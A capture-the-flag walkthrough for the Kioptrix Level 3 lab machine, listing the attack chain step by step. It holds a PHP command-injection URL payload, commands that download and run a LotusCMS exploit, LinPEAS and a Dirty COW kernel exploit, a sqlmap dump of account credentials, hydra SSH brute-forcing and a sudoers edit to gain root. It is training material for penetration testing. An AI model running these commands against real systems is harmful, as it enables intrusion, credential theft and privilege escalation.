
# 🛡️ Kioptrix Level 3 Walkthrough (CTF Guide)

## 🧭 1. Initial Recon

### Edit `/etc/hosts` to Resolve Domain
```bash
sudo nano /etc/hosts
```
Add the following:
```
192.168.204.137 kioptrix3.com
```

### Ping Discovery
```bash
sudo nmap -sn 192.168.204.0/24
```

### Port Scan
```bash
nmap -T4 -sS -Pn -p- 192.168.204.137
nmap -T4 -sS -A -Pn -p- 192.168.204.137
```

## 🧪 2. Web Enumeration

### Check for LFI / RCE

Try this payload in the browser:

```http
http://kioptrix3.com/index.php?page=index');echo system('id');//
```

If successful, you'll get output like:
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## ⚙️ 3. Exploiting LotusCMS (if detected)

### Search for Exploit
```bash
searchsploit locuscms
searchsploit -m php/remote/18565.rb
```

### Alternatively, Use a Shell Script Exploit
```bash
wget https://raw.githubusercontent.com/Hood3dRob1n/LotusCMS-Exploit/master/lotusRCE.sh
chmod +x lotusRCE.sh
./lotusRCE.sh http://192.168.204.137 /
```

## 🔧 4. Reverse Shell Upgrade (After Gaining Access)

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
Then:
1. Press `Ctrl + Z`
2. Run:
```bash
stty raw -echo; fg
```
3. Press `Enter` to return to shell

## 🔍 5. Privilege Escalation - Part 1

### Download LinPEAS
On attack box:
```bash
python3 -m http.server 8080
```
On target machine:
```bash
wget http://192.168.204.136:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh > result.txt
```

### Grep for Credentials
```bash
grep -Ei 'password|passwd|shadow|id_rsa|private|secret|credential|key|token' result.txt
```

### Found in Web Config:
```bash
cat /home/www/kioptrix3.com/gallery/gconfig.php
```

## 🔐 6. SQL Injection to Dump DB

Using SQLMap:
```bash
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --level 5 --risk 3 -p id,sort --dbms=mysql --output-dir=sqlmap
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --level 5 --risk 3 -p id,sort --dbs --output-dir=sqlmap
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --level 5 --risk 3 -p id,sort -D gallery --tables --output-dir=sqlmap
sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" --level 5 --risk 3 -p id,sort -D gallery -T dev_accounts --dump --output-dir=sqlmap
```

Example credentials found:
```
Username: loneferret
Password: starwars
```

## 🔐 7. SSH Login / Brute Force

### Login with Password
```bash
ssh loneferret@192.168.204.137 -oHostKeyAlgorithms=+ssh-rsa
```

### Brute Force with Hydra (Optional)
```bash
hydra -l loneferret -P /usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords.txt 192.168.204.137 -t 4 ssh
```

## 🔓 8. Privilege Escalation - Part 2

### Check `sudo -l`
```bash
sudo -l
```
Example output:
```
(root) NOPASSWD: !/usr/bin/su
(root) NOPASSWD: /usr/local/bin/ht
```

### Escalate with `ht`
```bash
sudo ht /etc/sudoers
```

#### Edit to Add:
```
loneferret ALL=(ALL:ALL) NOPASSWD: ALL
```

Save and exit. Then:

```bash
sudo su
```

## 🧨 9. Dirty COW Exploit (Kernel Priv Esc)

### Check Kernel
```bash
uname -a
cat /proc/version_signature
```

### Download Exploit
```bash
wget http://192.168.204.136:8080/dirty.c
```

### Compile Exploit
```bash
gcc -pthread dirty.c -o dirty -lcrypt
```

### Run Exploit
```bash
./dirty password
```

Login with:
```bash
su firefart
```

## 🗂️ 10. Directory Brute-Forcing

```bash
ffuf -u http://kioptrix3.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt -mc 200,204,301,302
```

## ✅ Summary

| Step                        | Tool/Command                                      |
|----------------------------|---------------------------------------------------|
| Host Discovery             | `nmap -sn`                                        |
| Port Scan                  | `nmap -sS -Pn -p-`                                |
| Web Exploit (RCE)          | `http://...system('id');//`                       |
| LotusCMS Exploit           | `lotusRCE.sh`                                     |
| Shell Upgrade              | `python -c 'import pty...`                        |
| LinPEAS + Grep             | `./linpeas.sh`, `grep -Ei 'password...'`          |
| SQL Injection              | `sqlmap -u ...`                                   |
| SSH Access                 | `ssh loneferret@...`                              |
| Privilege Escalation (ht)  | `sudo ht /etc/sudoers`                            |
| Privilege Escalation (dirtycow) | `gcc ...`, `./dirty`                      |
